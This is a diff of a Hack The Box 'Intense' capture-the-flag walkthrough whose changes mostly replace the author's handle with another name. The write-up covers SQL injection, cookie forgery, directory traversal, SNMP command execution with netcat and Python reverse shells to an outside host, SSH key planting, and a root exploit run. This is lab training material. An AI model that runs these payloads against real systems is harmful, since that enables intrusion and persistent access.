@@ -9,6 +9,7 @@ avatar: assets/htb/intense.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Intense
 ---
+
 ## Enumeration
 
 ### Nmap scan
@@ -16,7 +17,7 @@ htb_url: https://app.hackthebox.com/machines/Intense
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ nmap -n -v -sCV -p- <YOUR_IP> -oA intense  
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-01 20:13 EST
 NSE: Loaded 153 scripts for scanning.
@@ -78,7 +79,7 @@ My nmap scan showed that only ports 22 - SSH and 80 - HTTP were open.
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-port80.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-port80.png)
 
 With so little to work with, I loaded the HTTP site hosted on port 80, and found a site that greeted me with a message with guest logon credentials.
 
@@ -88,7 +89,7 @@ The site also pointed out that it was open source, and had a link that let me do
 
 > This app is opensource !
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-guest-login.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-guest-login.png)
 
 After logging in with the guest credentials, there was a message that said:
 
@@ -96,18 +97,18 @@ After logging in with the guest credentials, there was a message that said:
 
 This appeared to be a hint that automated tools would not work to get whatever I needed from this site.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-message-submit.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-message-submit.png)
 
 On the `/submit` page I found an input box, and of course I had to see what kind of vulnerabilities it might have!  First I tried the basic `<script>alert('test')</script>` test, and got an interesting error right away.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-syntax-error.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-syntax-error.png)
 
 While testing for XSS, I found that the input box seemed to hint at SQL injection vulnerability since it seemed to have problems with me using single quotes.  After testing this for a short time I decided to look into the code from the `src.zip` I downloaded from the main page to find out what kind of queries I might need to formulate.
 
 ### Source Code Review
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ tree app         
 app
 ├── admin.py
@@ -167,15 +168,15 @@ app
 
 The file `src.zip` contained source code templates for the website, in a folder called `app`.  The most interesting files were the python code files which ran the site using the Flask framework.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-adminpy.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-adminpy.png)
 
 In the file `admin.py` I found a few new directory paths to check out. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-admin.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-admin.png)
 
 The `/admin` page was forbidden, as expected.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-adminlog.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-adminlog.png)
 
 As noted in the code, the two `/admin/log` paths required POST rather than GET requests.  It looked like I would need an admin session token to get anything out of these sites.  
 
@@ -437,11 +438,11 @@ The final file `utils.py` also contained some interesting methods. The method `i
 
 ### SQLite SQL Injection
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-sqli.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-sqli.png)
 
 Using information from `utils.py` I crafted the query: `' AND select secret from users where username = admin and role =1`, but got another syntax error.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-sqli-close.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-sqli-close.png)
 
 `a') UNION SELECT password FROM users --` resulted in the error `no such column: password`. However, substituting 'password' with 'secret' made it so the message was submitted with no error messages.  From the source code I could see that the backend database was sqlite3, so I did some research into doing SQL injection on this type of database.  I found a few resources that helped explain what I was doing wrong.
 
@@ -458,30 +459,30 @@ I seemed like I would have to brute force each character of the secret string. I
 
 I was encountering a problem with my output only matching a zero `'0'` for the secret until I searched for SQLite3 error-based injection and found a \(russian-language\) site that showed how to use MATCH to get this to work properly.  [https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search](https://translate.google.com/translate?hl=en&sl=ru&u=https://rdot.org/forum/showthread.php%3Fp%3D26419&prev=search)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-sqli-nomatch.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-sqli-nomatch.png)
 
 However I still encountered a problem, since it seemed as if I wasn't able to use the MATCH\(\) method in this context.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-sqli-substring.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-sqli-substring.png)
 
 I also made a mistake when typing in the method SUBSTR, and I got a bit frustrated with sending individual queries through the website so I moved on to Burp suite to optimize my query testing.  After awhile I finally worked out the kinks and got a working query.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-intruder-payload.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-intruder-payload.png)
 
 To test my theory I used Burp's Intruder to test a brute force of all alpha-numeric characters on the first character of the 'secret' string.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-intruder-test%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-intruder-test%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529%2520%25281%2529.png)
 
 I set Intruder to only fuzz the single character at a time in my query.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-intruder-first-f.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-intruder-first-f.png)
 
 After letting the fuzzer run, I found that the first character in the admin's secret was `'f'`.  This was the only request that received an HTTP 200 OK message.
 
 ### Using python to brute force
 
 ```bash
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ echo -n '84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec' | wc -c
 64
 ```
@@ -529,7 +530,7 @@ print("--- %s seconds ---" % (time.time() - start_time))
 My finalized python script was fairly short, and mostly consisted of creating a request with the SQL injection query in it.  I then iterated over all printable ASCII characters for each of the 64 positions in the secret.  I also added a little timer to see how long it would take to brute force the whole secret.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ python3 ./secret-brute-force.py 
 Iterating through all 64 chars in the secret: 
 The secret for admin is: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
@@ -547,7 +548,7 @@ sm`Æ
 
 Next I crafted my new `auth` cookie, `base64`'d it, and got the result: `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-broke-site.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-broke-site.png)
 
 Using this cookie, however, broke the whole site and made it so no pages would load. I figured it had something to do with the unreadable signature characters that were appended to the end of the secret in the cookie.
 
@@ -615,7 +616,7 @@ Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c8
 
 For some reason the `hashpumpy` module added the guest cookie to the admin cookie, then appended the signature of them both together.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-welcomeadmin.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-welcomeadmin.png)
 
 However this mega-cookie worked and I was able to login to the `/admin` page successfully.  
 
@@ -625,29 +626,29 @@ However this mega-cookie worked and I was able to login to the `/admin` page suc
 
 Back in the `admin.py` file it mentioned using the `logfile` and `logdir` properties on their respective directories, along with the POST method after logging in as admin.  This looked like a task for Burp Repeater.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-etcpasswd.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-etcpasswd.png)
 
 The `logfile` property was susceptible to directory traversal, and through Burp I was able to download `/etc/passwd`.  There were only two users that had the ability to login: `root` and `user`. I noticed an unusual user named `debian_snmp`, so I decided to see what I could find using the SNMP service. \(Another nmap scan revealed that UDP port 161 was open, which is the default SNMP port!\)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-snmpd-conf.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-snmpd-conf.png)
 
 While looking at the SNMP configuration files, I found a read/write community string of `SuP3RPrivCom90` in `snmpd.conf`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-ssh-conf.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-ssh-conf.png)
 
 ssh.conf - nothing useful
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-user-folder.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-user-folder.png)
 
 I also used the logdir property to enumerate the contents of `/home/user`.  This folder contained the file `user.txt`, so I knew I was on the right track.
 
 ### User.txt
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-user-txt.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-user-txt.png)
 
 This was interesting...it isn't very often that I am able to get the user flag through web requests.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-user-ssh.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-user-ssh.png)
 
 I also checked for the presence of the `authorized_keys` file, since this is a great way to gain persistence.
 
@@ -671,7 +672,7 @@ echo "" > /etc/snmp/snmp.conf
 installed snmp MIBs
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP>                                                   2 ⚙
 SNMPv2-MIB::sysDescr.0 = STRING: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
 SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
@@ -706,7 +707,7 @@ SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notification
 Not much information gained from SNMP walk
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                             130 ⨯ 2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
@@ -724,7 +725,7 @@ NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
 > snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c   host-with-snmpd.lan  'nsExtendStatus."command"' = createAndGo  'nsExtendCommand."command"' = /bin/echo  'nsExtendArgs."command"' = 'hello world'
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 <YOUR_IP> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/nc 10.10.15.100 55541 -e /bin/bash' 'nsExtendArgs."command"'    = 'hello world' 
 NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
 NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/nc 10.10.15.100 55541 -e /bin/bash
@@ -734,7 +735,7 @@ NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: hello world
 created my command to send nc reverse shell
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
@@ -760,7 +761,7 @@ Unfortunately the version of `nc` on the victim's computer did not have `-e` fun
 ## Getting a shell
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
@@ -779,7 +780,7 @@ NET-SNMP-EXTEND-MIB::nsExtendResult."test1" = INTEGER: 0
 NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
 NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 1
 
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
@@ -789,7 +790,7 @@ Timeout: No Response from <YOUR_IP>
 I tried sending a reverse shell, but got an End-of-Line error
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 <YOUR_IP> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/usr/bin/python3' 'nsExtendArgs."command"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"' 
 NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
 NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /usr/bin/python3
@@ -801,7 +802,7 @@ connected to my
 after trying a few things realized that some of the internal quotes needed to be escaped for it to run properly
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ nc -lvnp 55541                              
 listening on [any] 55541 ...
 connect to [10.10.15.100] from (UNKNOWN) [<YOUR_IP>] 60688
@@ -822,7 +823,7 @@ There was a strange problem I encountered with this SNMP shell...if I lost my sh
 ### Enumeration as `Debian-snmp`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ nc -lvnp 55541
 listening on [any] 55541 ...
 connect to [10.10.15.100] from (UNKNOWN) [<YOUR_IP>] 57960
@@ -887,17 +888,17 @@ TODO: Where is the note\_server.c code?
 Analysis of the note\_server.c code showed me that the program was looking for a connection to `127.0.0.1` on port 5001.  
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 <YOUR_IP> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/bash' 'nsExtendArgs."command"' = "-c \"/bin/echo ${ssh_key} >> ~/.ssh/authorized_keys\""
 NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
 NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
-NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "/bin/echo ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbT4GbSUckWcD775fh2EvAIst9754Yn0+88VlmfbV9qXiCEUeCrHXiEFc1KYDYnx/3CEUgu8gby04mHtBdP6n8= zweilos@kali >> ~/.ssh/authorized_keys"
+NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "/bin/echo ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbT4GbSUckWcD775fh2EvAIst9754Yn0+88VlmfbV9qXiCEUeCrHXiEFc1KYDYnx/3CEUgu8gby04mHtBdP6n8= kac0@kali >> ~/.ssh/authorized_keys"
 ```
 
 I tried echoing my ssh key to `user` but got a permission denied error, so I tried to see if I could do the same for the `Debian-snmp` user, and got partial success
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ ssh -i intense.key Debian-snmp@<YOUR_IP>                                                   255 ⨯
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
 
@@ -922,17 +923,17 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
 Last login: Tue Jun 30 09:34:08 2020 from 10.10.14.2
 Connection to <YOUR_IP> closed.
 
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ ssh -i intense.key Debian-snmp@<YOUR_IP> "bash --noprofile --norc"                           1 ⨯
 
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ ssh -i intense.key Debian-snmp@<YOUR_IP> "/bin/sh"
 ```
 
 I was successful in copying my key, but I wasn't able to login and get a shell. I tried a few bypass methods, but it seemed as if they had it locked down.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@<YOUR_IP> -i intense.key
 ```
 
@@ -989,7 +990,7 @@ End of assembler dump.
 Breakpoint 2 at 0xd27
 (gdb) set follow-fork-mode child
 (gdb) run
-Starting program: /home/zweilos/htb/intense/noteserver 
+Starting program: /home/kac0/htb/intense/noteserver 
 Warning:
 Cannot insert breakpoint 2.
 Cannot access memory at address 0xd27
@@ -1080,9 +1081,9 @@ Copied and cleaned up the code from the official writeup, then ran it TODO: expl
 ### Root.txt
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/intense]
+┌──(kac0㉿kali)-[~/htb/intense]
 └─$ python3 ./pwn-note_server2.py
-[*] '/home/zweilos/htb/intense/note_server'
+[*] '/home/kac0/htb/intense/note_server'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
@@ -1095,12 +1096,12 @@ Copied and cleaned up the code from the official writeup, then ran it TODO: expl
 [*] Loaded 14 cached gadgets for './note_server'
 [+] Libc leak : 0x7fa1096c5070
 [+] Opening connection to 127.0.0.1 on port 5001: Done
-[*] Loading gadgets for '/home/zweilos/htb/intense/libc.so.6'
+[*] Loading gadgets for '/home/kac0/htb/intense/libc.so.6'
 [*] Switching to interactive mode
 $ id
 uid=0(root) gid=0(root) groups=0(root)
 $ hostname
 intense
 $ cat /root/root.txt
-b3e4****21d7
+b3e4************************21d7
 ```
